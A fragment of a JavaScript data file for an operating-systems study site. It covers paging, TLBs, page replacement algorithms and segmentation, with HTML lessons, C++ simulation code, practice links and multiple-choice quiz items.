Type</th><th>Levels</th><th>Advantage</th><th>Disadvantage</th></tr><tr><td>Single-level</td><td>1</td><td>Simple, fast</td><td>4 MB per process even if mostly unused</td></tr><tr><td>Two-level</td><td>2</td><td>Sparse address space efficient</td><td>Extra memory access per lookup</td></tr><tr><td>Four-level (x86-64)</td><td>4</td><td>Supports 48-bit virtual space</td><td>4 memory accesses per translation</td></tr><tr><td>Inverted</td><td>1 global</td><td>Fixed size regardless of processes</td><td>Slow lookup without hash</td></tr><tr><td>Hashed</td><td>1 with hash</td><td><span class="learn-complexity">O(1) lookup</span></td><td>Hash collisions</td></tr></table><p class="learn-p"><b>Huge Pages (2 MB / 1 GB):</b> Reduce TLB pressure by covering more memory per entry. Critical for databases and HPC workloads.</p></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>TLB is process-specific:</b> On a context switch, the TLB must be flushed (or tagged with ASIDs).</li><li><b>Page table walks are expensive:</b> On x86-64, a TLB miss costs 4 memory accesses. With 100 ns latency, that is 400 ns per miss.</li><li><b>Internal fragmentation:</b> The last page may not be fully used. With 2 MB huge pages, average waste is 1 MB.</li><li><b>Page table size for 64-bit:</b> A single-level page table would need 2^52 entries. Multi-level is mandatory.</li><li><b>Shared pages and COW:</b> Multiple processes can share the same physical frame. COW marks shared pages read-only until one writes.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Operation</th><th>TLB Hit</th><th>TLB Miss (4-level)</th><th>Notes</th></tr><tr><td>Address translation</td><td>~1 ns (hardware parallel)</td><td>~400 ns (4 memory accesses)</td><td>TLB hit rate typically 95-99%</td></tr><tr><td>TLB flush (full)</td><td colspan="2">~100-1000 ns</td><td>Required on process context switch without ASIDs</td></tr><tr><td>Page table memory</td><td colspan="2">4 KB - 4 MB per process</td><td>Depends on address space usage and levels</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Calculate physical address given logical address, page size, and page table.</b><br>A: Split: page number = address / page_size, offset = address % page_size. Look up page number in page table to get frame number. Physical address = frame_number * page_size + offset.</p><p class="learn-p"><b>Q2: Why do 64-bit systems need multi-level page tables?</b><br>A: A single-level for 48-bit address space with 4 KB pages needs 2^36 entries = 256 GB per process. Multi-level only allocates inner tables for address ranges actually used.</p><p class="learn-p"><b>Q3: What is the TLB and why is it critical?</b><br>A: The TLB is a small (64-1024 entry), fully associative hardware cache for page-to-frame mappings. Without TLB, every memory access needs 4 extra accesses on x86-64.</p><p class="learn-p"><b>Q4: What are huge pages and when to use them?</b><br>A: Huge pages (2 MB or 1 GB) cover more virtual memory per TLB entry. Use for databases, HPC, VMs. Drawback: higher internal fragmentation.</p><p class="learn-p"><b>Q5: How does the inverted page table save memory?</b><br>A: One entry per physical frame (fixed size) instead of one per virtual page per process. Each entry stores (PID, page_number). Translation requires searching (solved with hashing).</p><p class="learn-p"><b>Q6: How does Copy-on-Write make fork() efficient?</b><br>A: After fork(), parent and child share all physical frames (marked read-only). Only when one writes does the OS copy that page. For fork()+exec(), the child replaces its address space immediately, so most pages are never copied.</p><p class="learn-p"><b>Q7: Compare First Fit, Best Fit, and Worst Fit allocation.</b><br>A: First Fit: allocate first sufficient hole (fastest, generally best). Best Fit: smallest sufficient hole (least waste per allocation but creates tiny fragments). Worst Fit: largest hole (poor performance). All suffer external fragmentation.</p></div>',
          code: `// Page Table Simulation and Address Translation in C++
#include <iostream>
#include <vector>
#include <unordered_map>
#include <cmath>
using namespace std;

// Simple single-level page table simulation
class PageTable {
    int pageSize;      // In bytes
    int numPages;
    int pageBits;      // Number of bits for offset
    struct PTE {
        int frameNumber;
        bool valid;
        bool dirty;
        bool referenced;
    };
    vector<PTE> table;

public:
    PageTable(int virtualSize, int pSize) : pageSize(pSize) {
        numPages = virtualSize / pageSize;
        pageBits = (int)log2(pageSize);
        table.resize(numPages, {-1, false, false, false});
        cout << "Page Table: " << numPages << " pages, "
             << pageSize << " bytes/page, offset bits: "
             << pageBits << endl;
    }

    void mapPage(int pageNum, int frameNum) {
        if (pageNum < numPages) {
            table[pageNum] = {frameNum, true, false, false};
            cout << "Mapped page " << pageNum << " -> frame "
                 << frameNum << endl;
        }
    }

    int translate(int logicalAddr) {
        int pageNum = logicalAddr / pageSize;
        int offset = logicalAddr % pageSize;

        cout << "Logical addr " << logicalAddr << " -> page="
             << pageNum << ", offset=" << offset;

        if (pageNum >= numPages || !table[pageNum].valid) {
            cout << " -> PAGE FAULT!" << endl;
            return -1;
        }

        int physAddr = table[pageNum].frameNumber * pageSize + offset;
        table[pageNum].referenced = true;
        cout << " -> frame=" << table[pageNum].frameNumber
             << ", physical=" << physAddr << endl;
        return physAddr;
    }
};

// TLB simulation
class TLB {
    struct TLBEntry {
        int pageNum;
        int frameNum;
        bool valid;
    };
    vector<TLBEntry> entries;
    int size;
    int hits, misses;

public:
    TLB(int s) : size(s), hits(0), misses(0) {
        entries.resize(s, {-1, -1, false});
    }

    int lookup(int pageNum) {
        for (auto& e : entries) {
            if (e.valid && e.pageNum == pageNum) {
                hits++;
                return e.frameNum;
            }
        }
        misses++;
        return -1; // TLB miss
    }

    void insert(int pageNum, int frameNum) {
        // Simple FIFO replacement
        static int next = 0;
        entries[next] = {pageNum, frameNum, true};
        next = (next + 1) % size;
    }

    void printStats() {
        int total = hits + misses;
        cout << "TLB Stats: hits=" << hits << " misses=" << misses
             << " hit ratio=" << (total > 0 ? (double)hits/total*100 : 0)
             << "%" << endl;
    }
};

// Effective Access Time calculation
void calculateEAT(double tlbTime, double memTime, double hitRatio) {
    double eat = hitRatio * (tlbTime + memTime)
               + (1 - hitRatio) * (tlbTime + 2 * memTime);
    cout << "\\nEAT Calculation:" << endl;
    cout << "TLB time=" << tlbTime << "ns, Mem time=" << memTime
         << "ns, Hit ratio=" << hitRatio * 100 << "%" << endl;
    cout << "EAT = " << eat << "ns" << endl;
    cout << "Slowdown vs no paging: "
         << (eat / memTime - 1) * 100 << "%" << endl;
}

int main() {
    // Virtual memory = 64KB, page size = 4KB
    cout << "=== Page Table Demo ===" << endl;
    PageTable pt(65536, 4096); // 16 pages
    pt.mapPage(0, 5);
    pt.mapPage(1, 8);
    pt.mapPage(3, 2);
    pt.mapPage(7, 12);

    pt.translate(0);       // Page 0, offset 0
    pt.translate(4096);    // Page 1, offset 0
    pt.translate(8192);    // Page 2, NOT mapped -> page fault
    pt.translate(12500);   // Page 3, offset 308
    pt.translate(30000);   // Page 7, offset 1616

    // TLB Demo
    cout << "\\n=== TLB Demo ===" << endl;
    TLB tlb(4); // 4-entry TLB
    int pages[] = {3, 7, 3, 1, 3, 7, 0, 3};
    for (int p : pages) {
        int frame = tlb.lookup(p);
        if (frame == -1) {
            cout << "Page " << p << ": TLB MISS" << endl;
            tlb.insert(p, p * 3); // Simulated frame mapping
        } else {
            cout << "Page " << p << ": TLB HIT (frame " << frame << ")" << endl;
        }
    }
    tlb.printStats();

    // EAT Calculation
    calculateEAT(10, 100, 0.95);

    return 0;
}`,
          problems: [
            ['Paging in Operating System', 'https://www.geeksforgeeks.org/paging-in-operating-system/', 'Easy'],
            ['Page Table Entries', 'https://www.geeksforgeeks.org/page-table-entries-in-page-table/', 'Medium'],
            ['Multilevel Paging', 'https://www.geeksforgeeks.org/multilevel-paging-in-operating-system/', 'Hard'],
            ['Inverted Page Table', 'https://www.geeksforgeeks.org/inverted-page-table-in-operating-system/', 'Medium'],
            ['First Fit, Best Fit, Worst Fit', 'https://www.geeksforgeeks.org/first-fit-allocation-in-operating-systems/', 'Easy'],
          ],
          mcqs: [
            {q: 'For a system with 32-bit logical addresses and 4 KB page size, how many entries are in the page table?', o: ['2^10', '2^12', '2^20', '2^32'], a: 2},
            {q: 'What is the purpose of the TLB?', o: ['To store recently used data from memory', 'To cache recently used page table entries for faster address translation', 'To manage disk I/O', 'To allocate physical frames'], a: 1},
            {q: 'If the TLB access time is 5ns, memory access time is 100ns, and TLB hit ratio is 80%, what is the effective access time?', o: ['84ns', '105ns', '125ns', '147ns'], a: 2},
            {q: 'What is Copy-on-Write (COW)?', o: ['Copying all pages on fork()', 'Sharing pages read-only and copying only on write', 'Writing to disk before reading', 'A cache coherence protocol'], a: 1},
            {q: 'Which contiguous memory allocation strategy generally performs best?', o: ['Best Fit', 'Worst Fit', 'First Fit', 'Next Fit'], a: 2},
            {q: 'On x86-64 with 4-level page tables and a TLB miss, how many memory accesses are needed for translation?', o: ['1', '2', '4', '5'], a: 2},
          ],
        },
        // ----- Topic 1: Page Replacement Algorithms -----
        {
          t: 'Page Replacement Algorithms',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">When your database server\'s buffer pool is full, the replacement algorithm determines which page to evict. Choose poorly and query latency spikes from microseconds to milliseconds. Real systems like Linux, PostgreSQL, and MySQL all implement sophisticated page replacement.</p></div><div class="learn-section"><div class="learn-h">Page Faults and Page Replacement</div><p class="learn-p">A <b>page fault</b> occurs when a process accesses a page that is not currently in physical memory. The OS must:</p><ol class="learn-list"><li>Trap to the OS (page fault interrupt).</li><li>Find the page on disk (swap space).</li><li>Find a free frame. If no free frame exists, select a <b>victim page</b> using a page replacement algorithm.</li><li>If the victim page is dirty, write it to disk first.</li><li>Load the desired page into the free frame.</li><li>Update the page table.</li><li>Restart the interrupted instruction.</li></ol><p class="learn-p">The goal is to minimize the <b>page fault rate</b>, as each page fault is very expensive (involves disk I/O).</p></div><div class="learn-section"><div class="learn-h">FIFO (First In First Out)</div><p class="learn-p">The simplest algorithm: replace the <b>oldest page</b> in memory. Implemented with a simple queue.</p><p class="learn-p"><b>Example:</b> Reference string: 7, 0, 1, 2, 0, 3, 0, 4, 2, 3, 0, 3, 2, 1, 2, 0, 1, 7, 0, 1. Frames = 3.</p><div class="learn-code">Frames: [7]      -> fault\n        [7,0]    -> fault\n        [7,0,1]  -> fault\n        [2,0,1]  -> fault (replace 7)\n        [2,0,1]  -> hit (0 already in)\n        [2,3,1]  -> fault (replace 0)\n        [2,3,0]  -> fault (replace 1)\n        [4,3,0]  -> fault (replace 2)\n        [4,2,0]  -> fault (replace 3)\n        [4,2,3]  -> fault (replace 0)\n        ...Total: 15 page faults</div><div class="learn-warn"><b>Warning:</b> FIFO suffers from <b>Belady\'s Anomaly</b>: increasing the number of frames can <b>increase</b> the number of page faults! This is counterintuitive and unique to FIFO.</div></div><div class="learn-section"><div class="learn-h">Optimal Page Replacement (OPT / MIN)</div><p class="learn-p">Replace the page that will <b>not be used for the longest time in the future</b>. This algorithm gives the <b>minimum possible</b> page faults. However, it requires knowledge of future references, making it impractical. It is used as a <b>benchmark</b> to compare other algorithms.</p><p class="learn-p">For the same reference string with 3 frames: <b>9 page faults</b> (optimal).</p></div><div class="learn-section"><div class="learn-h">LRU (Least Recently Used)</div><p class="learn-p"><b>LRU</b> replaces the page that has <b>not been used for the longest time in the past</b>. It approximates OPT by using recent history to predict future behavior.</p><p class="learn-p"><b>Implementation methods:</b></p><ul class="learn-list"><li><b>Counter-based:</b> Each page has a timestamp. On access, update the timestamp. Replace the page with the smallest timestamp. <span class="learn-complexity">O(n)</span> to find victim.</li><li><b>Stack-based:</b> Maintain a stack of page numbers. On access, move the page to the top. The bottom of the stack is the LRU page. Use a doubly-linked list + hash map for <span class="learn-complexity">O(1)</span> operations.</li></ul><p class="learn-p">For the same reference string with 3 frames: <b>12 page faults</b>.</p><div class="learn-tip"><b>Tip:</b> LRU does NOT suffer from Belady\'s Anomaly because it is a <b>stack algorithm</b>: the set of pages in memory with n+1 frames is always a superset of those with n frames.</div></div><div class="learn-section"><div class="learn-h">LRU Approximation Algorithms</div><p class="learn-p">True LRU is expensive to implement in hardware. Practical systems use approximations:</p><p class="learn-p"><b>Clock Algorithm (Second Chance):</b></p><ol class="learn-list"><li>Arrange frames in a circular buffer with a pointer.</li><li>Each page has a <b>reference bit</b> (set to 1 when accessed by hardware).</li><li>When a replacement is needed, check the page pointed to by the clock hand:</li><li>If reference bit = 1: Set it to 0 (give a second chance), advance the pointer.</li><li>If reference bit = 0: Replace this page.</li></ol><p class="learn-p">The clock algorithm approximates LRU with <span class="learn-complexity">O(1)</span> amortized cost per replacement.</p></div><div class="learn-section"><div class="learn-h">Comparison of Page Replacement Algorithms</div><table class="learn-table"><tr><th>Algorithm</th><th>Page Faults (example)</th><th>Belady\'s Anomaly?</th><th>Practical?</th><th>Complexity</th></tr><tr><td>FIFO</td><td>15</td><td>Yes</td><td>Yes (simple)</td><td><span class="learn-complexity">O(1)</span></td></tr><tr><td>OPT</td><td>9</td><td>No</td><td>No (needs future)</td><td><span class="learn-complexity">O(n)</span></td></tr><tr><td>LRU</td><td>12</td><td>No</td><td>Expensive hardware</td><td><span class="learn-complexity">O(1)</span> with stack</td></tr><tr><td>Clock</td><td>~LRU</td><td>No</td><td>Yes (most common)</td><td><span class="learn-complexity">O(1)</span> amortized</td></tr></table><div class="learn-tip"><b>Tip:</b> In interviews, practice tracing through a reference string with each algorithm. The most commonly asked are FIFO, LRU, and OPT. Be ready to explain Belady\'s anomaly and why LRU is preferred over FIFO.</div></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>Algorithm</th><th>Strategy</th><th>Hardware Support</th><th>Real-World Use</th></tr><tr><td>FIFO</td><td>Replace oldest loaded page</td><td>None</td><td>Simple caches</td></tr><tr><td>OPT/MIN</td><td>Replace page not used for longest future time</td><td>Requires future knowledge</td><td>Benchmark only</td></tr><tr><td>LRU</td><td>Replace least recently used</td><td>Counter or stack</td><td>Database buffer pools</td></tr><tr><td>Clock (Second Chance)</td><td>FIFO + reference bit check</td><td>Reference bit</td><td>Linux, BSD</td></tr><tr><td>Enhanced Clock (NRU)</td><td>Consider reference AND dirty bits</td><td>Reference + dirty bits</td><td>Windows</td></tr><tr><td>LFU</td><td>Replace least frequently used</td><td>Frequency counter</td><td>CDN caches</td></tr><tr><td>ARC (Adaptive)</td><td>Balances LRU and LFU</td><td>Two LRU lists</td><td>ZFS, some databases</td></tr></table></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>Belady\'s Anomaly is unique to non-stack algorithms:</b> FIFO can have MORE page faults with MORE frames. LRU, OPT, and Clock are immune.</li><li><b>Dirty page cost:</b> Evicting a dirty page requires writing to disk first, doubling I/O cost.</li><li><b>LRU is expensive in hardware:</b> True LRU requires updating metadata on every access. Practical systems use Clock approximation.</li><li><b>Working set mismatch:</b> If the working set exceeds frames, ALL algorithms perform poorly. The solution is more memory.</li><li><b>Sequential scan problem:</b> A single sequential scan through a large file can evict all useful pages.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Algorithm</th><th>Time per Replacement</th><th>Space Overhead</th><th>Belady\'s Anomaly?</th></tr><tr><td>FIFO</td><td><span class="learn-complexity">O(1)</span></td><td>Queue pointer</td><td>Yes</td></tr><tr><td>OPT</td><td><span class="learn-complexity">O(n * |future|)</span></td><td>None extra</td><td>No</td></tr><tr><td>LRU (stack)</td><td><span class="learn-complexity">O(1)</span></td><td>Doubly-linked list + hash map</td><td>No</td></tr><tr><td>Clock</td><td><span class="learn-complexity">O(n) worst, O(1) amortized</span></td><td>1 bit per frame</td><td>No</td></tr><tr><td>Enhanced Clock</td><td><span class="learn-complexity">O(n) worst</span></td><td>2 bits per frame</td><td>No</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Trace FIFO, LRU, and OPT for reference string 1,2,3,4,1,2,5,1,2,3,4,5 with 3 frames.</b><br>A: FIFO: 9 faults. LRU: 10 faults. OPT: 7 faults. With 4 frames, FIFO gives 10 faults (MORE than 3 frames) &mdash; Belady\'s Anomaly.</p><p class="learn-p"><b>Q2: What is Belady\'s Anomaly and which algorithms are immune?</b><br>A: More frames causing MORE faults. Only non-stack algorithms (FIFO) exhibit it. Stack algorithms (LRU, OPT, LFU) are immune because adding a frame always produces a superset of pages.</p><p class="learn-p"><b>Q3: How does Clock approximate LRU?</b><br>A: Clock uses a reference bit and a hand pointer. On replacement, if bit=1, clear it and move on (second chance). If bit=0, evict. Recently accessed pages have bit=1 and survive at least one sweep.</p><p class="learn-p"><b>Q4: How does the LRU cache work? (LeetCode 146)</b><br>A: Doubly-linked list (MRU at head, LRU at tail) + hash map (key to node). Get: O(1) lookup, move to head. Put: O(1) insert at head, evict from tail if full.</p><p class="learn-p"><b>Q5: Why don\'t real OS use true LRU?</b><br>A: True LRU requires updating metadata on EVERY memory access. Instead, hardware provides a reference bit set on access. The OS periodically clears bits and uses Clock to approximate LRU.</p></div>',
          code: `// Page Replacement Algorithms: FIFO, LRU, Optimal
#include <iostream>
#include <vector>
#include <queue>
#include <unordered_set>
#include <unordered_map>
#include <list>
#include <climits>
using namespace std;

// FIFO Page Replacement
int fifo(vector<int>& pages, int frames) {
    queue<int> q;
    unordered_set<int> inMemory;
    int faults = 0;

    cout << "=== FIFO (frames=" << frames << ") ===" << endl;
    for (int page : pages) {
        if (inMemory.find(page) == inMemory.end()) {
            faults++;
            if ((int)q.size() >= frames) {
                int victim = q.front(); q.pop();
                inMemory.erase(victim);
                cout << "  Replace " << victim << " with " << page << endl;
            } else {
                cout << "  Load " << page << endl;
            }
            q.push(page);
            inMemory.insert(page);
        } else {
            cout << "  Hit: " << page << endl;
        }
    }
    cout << "Total faults: " << faults << endl;
    return faults;
}

// LRU Page Replacement (using list + map for O(1))
int lru(vector<int>& pages, int frames) {
    list<int> lruList;          // Most recent at front
    unordered_map<int, list<int>::iterator> pageMap;
    int faults = 0;

    cout << "\\n=== LRU (frames=" << frames << ") ===" << endl;
    for (int page : pages) {
        if (pageMap.find(page) == pageMap.end()) {
            faults++;
            if ((int)lruList.size() >= frames) {
                int victim = lruList.back(); // LRU page
                lruList.pop_back();
                pageMap.erase(victim);
                cout << "  Replace " << victim << " with " << page << endl;
            } else {
                cout << "  Load " << page << endl;
            }
        } else {
            cout << "  Hit: " << page << endl;
            lruList.erase(pageMap[page]); // Remove from current position
        }
        lruList.push_front(page);         // Add to front (most recent)
        pageMap[page] = lruList.begin();
    }
    cout << "Total faults: " << faults << endl;
    return faults;
}

// Optimal Page Replacement
int optimal(vector<int>& pages, int frames) {
    unordered_set<int> inMemory;
    vector<int> memFrames;
    int faults = 0;

    cout << "\\n=== Optimal (frames=" << frames << ") ===" << endl;
    for (int i = 0; i < (int)pages.size(); i++) {
        if (inMemory.find(pages[i]) == inMemory.end()) {
            faults++;
            if ((int)memFrames.size() >= frames) {
                // Find page not used for longest time in future
                int farthest = -1, victimIdx = 0;
                for (int j = 0; j < (int)memFrames.size(); j++) {
                    int nextUse = INT_MAX;
                    for (int k = i + 1; k < (int)pages.size(); k++) {
                        if (pages[k] == memFrames[j]) {
                            nextUse = k; break;
                        }
                    }
                    if (nextUse > farthest) {
                        farthest = nextUse;
                        victimIdx = j;
                    }
                }
                cout << "  Replace " << memFrames[victimIdx]
                     << " with " << pages[i] << endl;
                inMemory.erase(memFrames[victimIdx]);
                memFrames[victimIdx] = pages[i];
            } else {
                memFrames.push_back(pages[i]);
                cout << "  Load " << pages[i] << endl;
            }
            inMemory.insert(pages[i]);
        } else {
            cout << "  Hit: " << pages[i] << endl;
        }
    }
    cout << "Total faults: " << faults << endl;
    return faults;
}

int main() {
    vector<int> pages = {7,0,1,2,0,3,0,4,2,3,0,3,2,1,2,0,1,7,0,1};
    int frames = 3;

    cout << "Reference string: ";
    for (int p : pages) cout << p << " ";
    cout << "\\n" << endl;

    int f1 = fifo(pages, frames);
    int f2 = lru(pages, frames);
    int f3 = optimal(pages, frames);

    cout << "\\n=== Summary ===" << endl;
    cout << "FIFO:    " << f1 << " faults" << endl;
    cout << "LRU:     " << f2 << " faults" << endl;
    cout << "Optimal: " << f3 << " faults (theoretical minimum)" << endl;

    return 0;
}`,
          problems: [
            ['LRU Cache (LeetCode 146)', 'https://leetcode.com/problems/lru-cache/', 'Medium'],
            ['Page Replacement Algorithms', 'https://www.geeksforgeeks.org/page-replacement-algorithms-in-operating-systems/', 'Medium'],
            ['Belady\'s Anomaly', 'https://www.geeksforgeeks.org/beladys-anomaly-in-page-replacement-algorithms/', 'Easy'],
            ['LFU Cache (LeetCode 460)', 'https://leetcode.com/problems/lfu-cache/', 'Hard'],
            ['Clock Algorithm Simulation', 'https://www.geeksforgeeks.org/second-chance-or-clock-page-replacement-policy/', 'Medium'],
          ],
          mcqs: [
            {q: 'Which page replacement algorithm can exhibit Belady\'s Anomaly?', o: ['LRU', 'Optimal', 'FIFO', 'Clock'], a: 2},
            {q: 'Which algorithm gives the minimum number of page faults?', o: ['LRU', 'FIFO', 'Clock', 'Optimal (OPT)'], a: 3},
            {q: 'In the Clock (Second Chance) algorithm, what happens when the clock hand encounters a page with reference bit = 1?', o: ['The page is replaced immediately', 'The reference bit is set to 0 and the hand moves on', 'The page is moved to the end of the queue', 'A page fault is generated'], a: 1},
            {q: 'Why is LRU called a "stack algorithm"?', o: ['It uses a stack data structure', 'Pages in n+1 frames are always a superset of pages in n frames', 'It stacks pages by age', 'It stores pages on the process stack'], a: 1},
            {q: 'What is the cost of evicting a dirty page?', o: ['Same as clean page eviction', 'Double: must write to disk before loading new page', 'Triple: read, write, then read again', 'No additional cost'], a: 1},
            {q: 'Which real-world system uses an enhanced Clock algorithm?', o: ['Linux', 'MySQL', 'Windows', 'ZFS'], a: 2},
          ],
        },
        {
          t: 'Segmentation & Segmented Paging',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">When your C program crashes with a Segmentation Fault, it tried to access memory outside a valid segment boundary. Segmentation divides memory into logical units (code, data, stack, heap) that reflect how programmers think about memory. Understanding segmentation explains seg faults and how x86 protected mode works.</p></div><div class="learn-section"><div class="learn-h">What is Segmentation?</div><p class="learn-p"><b>Segmentation</b> divides a process\'s address space into <b>logical segments</b> — variable-sized units that reflect the programmer\'s view: code segment, data segment, stack, heap, etc. Each segment has a name (or number) and a length.</p><p class="learn-p">Unlike paging (which divides memory into fixed-size pages regardless of logical structure), segmentation preserves the logical grouping of related data.</p></div><div class="learn-section"><div class="learn-h">Segment Table</div><p class="learn-p">Each process has a <b>segment table</b> where each entry contains:</p><table class="learn-table"><tr><th>Field</th><th>Purpose</th></tr><tr><td>Base</td><td>Starting physical address of the segment</td></tr><tr><td>Limit</td><td>Length of the segment</td></tr></table><p class="learn-p"><b>Address translation:</b> A logical address is a pair <code>(segment_number, offset)</code>. If <code>offset &lt; limit</code>, the physical address = <code>base + offset</code>. If <code>offset ≥ limit</code>, a <b>segmentation fault</b> (trap) occurs.</p><div class="learn-code">Logical address: (segment 2, offset 400)\nSegment table entry 2: base=4300, limit=1000\nSince 400 &lt; 1000 → Physical address = 4300 + 400 = 4700\n\nLogical address: (segment 2, offset 1200)\nSince 1200 ≥ 1000 → SEGMENTATION FAULT</div></div><div class="learn-section"><div class="learn-h">Paging vs Segmentation</div><table class="learn-table"><tr><th>Feature</th><th>Paging</th><th>Segmentation</th></tr><tr><td>Division size</td><td>Fixed (page size)</td><td>Variable (segment length)</td></tr><tr><td>User view</td><td>Transparent to user</td><td>Reflects logical structure</td></tr><tr><td>Fragmentation</td><td>Internal (last page may not be full)</td><td>External (gaps between segments)</td></tr><tr><td>Address</td><td>(page_number, offset)</td><td>(segment_number, offset)</td></tr><tr><td>Sharing</td><td>Harder (page boundaries)</td><td>Natural (share code segment)</td></tr></table></div><div class="learn-section"><div class="learn-h">Segmented Paging</div><p class="learn-p"><b>Segmented paging</b> combines both: each segment is divided into pages. Address translation is two-level: segment number → segment\'s page table → page frame.</p><div class="learn-code">Logical address: (segment, page, offset)\n1. Segment table[segment] → page table base\n2. Page table[page] → frame number\n3. Physical address = frame * page_size + offset</div><p class="learn-p">This gives the logical organization of segmentation with the fixed-size allocation benefits of paging (no external fragmentation).</p><div class="learn-tip"><b>Tip:</b> Intel x86 (32-bit) used segmented paging. Modern 64-bit systems mostly use flat paging — segmentation is effectively disabled but still exists in the architecture.</div></div><div class="learn-section"><div class="learn-h">Memory-Mapped Files (mmap)</div><p class="learn-p"><b>Memory-mapped I/O</b> maps a file (or device) directly into a process\'s virtual address space. Instead of using read()/write() system calls, the process accesses file content through normal memory operations.</p><div class="learn-code">// POSIX mmap:\nvoid* addr = mmap(NULL, length, PROT_READ | PROT_WRITE,\n                 MAP_SHARED, fd, offset);\n// Now addr[0..length-1] maps to file content\n// Changes written to addr are reflected in the file\nmunmap(addr, length);</div><ul class="learn-list"><li><b>Advantages:</b> Zero-copy access, kernel manages page-in/page-out via demand paging, multiple processes can share the mapping (shared memory).</li><li><b>MAP_SHARED vs MAP_PRIVATE:</b> Shared mappings write back to the file and are visible to other processes. Private mappings use COW — writes only affect the calling process.</li><li><b>Used in:</b> Database buffer pools (PostgreSQL shared_buffers), dynamic linker (loading .so libraries), IPC via shared memory, large file processing.</li></ul><div class="learn-tip"><b>Tip:</b> Memory-mapped files are used extensively in trading systems for fast access to market data files and shared state between processes.</div></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>Scheme</th><th>Division Unit</th><th>Fragmentation</th><th>Sharing</th><th>Example</th></tr><tr><td>Pure Paging</td><td>Fixed-size pages</td><td>Internal only</td><td>Page-level</td><td>Most modern OS</td></tr><tr><td>Pure Segmentation</td><td>Variable-size segments</td><td>External</td><td>Segment-level (natural)</td><td>Multics</td></tr><tr><td>Segmented Paging</td><td>Segments divided into pages</td><td>Internal only</td><td>Segment or page level</td><td>Intel x86 (32-bit)</td></tr><tr><td>Paged Segmentation</td><td>Pages grouped into segments</td><td>Internal only</td><td>Both levels</td><td>IBM OS/2</td></tr></table></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>External fragmentation in segmentation:</b> Variable-size segments create gaps. Compaction is expensive.</li><li><b>Segment limit checking:</b> Every access checks offset against limit. If offset &ge; limit, segmentation fault is raised.</li><li><b>Segmentation mostly disabled in x86-64:</b> 64-bit mode uses flat model (base=0, limit=max). Segments still used for thread-local storage (FS/GS registers).</li><li><b>Sharing with segmentation:</b> Two processes can share a code segment by mapping the same physical memory. More natural than page-level sharing.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Scheme</th><th>Address Translation</th><th>Memory Overhead</th><th>Fragmentation Type</th></tr><tr><td>Paging</td><td>1 memory access (+ TLB)</td><td>Page table (~4 MB for 32-bit)</td><td>Internal</td></tr><tr><td>Segmentation</td><td>1 memory access (segment table)</td><td>Segment table (small)</td><td>External</td></tr><tr><td>Segmented Paging</td><td>2 memory accesses (segment + page table)</td><td>Segment table + page tables per segment</td><td>Internal only</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What causes a segmentation fault?</b><br>A: Accessing memory outside a valid segment\'s boundaries or violating segment protection. In modern paging systems, also accessing an unmapped or protected virtual page.</p><p class="learn-p"><b>Q2: Why does segmentation naturally support sharing?</b><br>A: Segments correspond to logical units. Two processes can share a code segment by having entries pointing to the same physical memory. Paging requires aligning shared regions to page boundaries.</p><p class="learn-p"><b>Q3: Why did modern systems move away from pure segmentation?</b><br>A: Segmentation causes external fragmentation, requires compaction, and makes allocation complex. Paging with fixed-size pages eliminates external fragmentation. x86-64 effectively disables segmentation.</p><p class="learn-p"><b>Q4: How does segmented paging combine both approaches?</b><br>A: Each segment is divided into fixed-size pages. Translation: segment number to page table base, then page table to frame number. Gives logical organization with no external fragmentation.</p><p class="learn-p"><b>Q5: Are segments still used in modern x86-64?</b><br>A: x86-64 uses flat segmentation (base=0, limit=max). However, FS and GS segment registers are still used for thread-local storage (TLS).</p><p class="learn-p"><b>Q6: What is memory-mapped I/O and when would you use it?</b><br>A: mmap() maps a file into virtual memory so you access it via pointers instead of read()/write(). Use for large files, shared memory between processes, and database buffer pools. The kernel handles paging transparently.</p><p class="learn-p"><b>Q7: What is the difference between MAP_SHARED and MAP_PRIVATE in mmap?</b><br>A: MAP_SHARED writes back to the file and is visible to other processes mapping the same file. MAP_PRIVATE uses Copy-on-Write: writes only affect the calling process and are not written to the file.</p></div>',
          code: `#include <iostream>
#include <vector>
using namespace std;

struct SegmentEntry {
    int base;
    int limit;
};

int translateAddress(vector<SegmentEntry>& segTable, int segNum, int offset) {
    if (segNum < 0 || segNum >= (int)segTable.size()) {
        cout << "Invalid segment number: " << segNum << endl;
        return -1;
    }
    if (offset < 0 || offset >= segTable[segNum].limit) {
        cout << "SEGMENTATION FAULT: offset " << offset
             << " exceeds limit " << segTable[segNum].limit << endl;
        return -1;
    }
    return segTable[segNum].base + offset;
}

int main() {
    // Segment table: {base, limit}
    vector<SegmentEntry> segTable = {
        {1400, 1000},  // Seg 0: Code segment
        {6300, 400},   // Seg 1: Data segment
        {4300, 1000},  // Seg 2: Stack segment
        {3200, 1100},  // Seg 3: Heap segment
    };

    cout << "Segment Table:\\n";
    cout << "Seg\\tBase\\tLimit\\n";
    for (int i = 0; i < (int)segTable.size(); i++)
        cout << i << "\\t" << segTable[i].base << "\\t" << segTable[i].limit << "\\n";

    // Valid translations
    cout << "\\n(Seg 2, Offset 400) -> " << translateAddress(segTable, 2, 400) << "\\n";
    cout << "(Seg 0, Offset 500) -> " << translateAddress(segTable, 0, 500) << "\\n";

    // Segmentation fault
    cout << "(Seg 1, Offset 500) -> ";
    translateAddress(segTable, 1, 500);

    return 0;
}`,
          problems: [
            ['Memory Segmentation - GFG', 'https://www.geeksforgeeks.org/segmentation-in-operating-system/', 'Medium'],
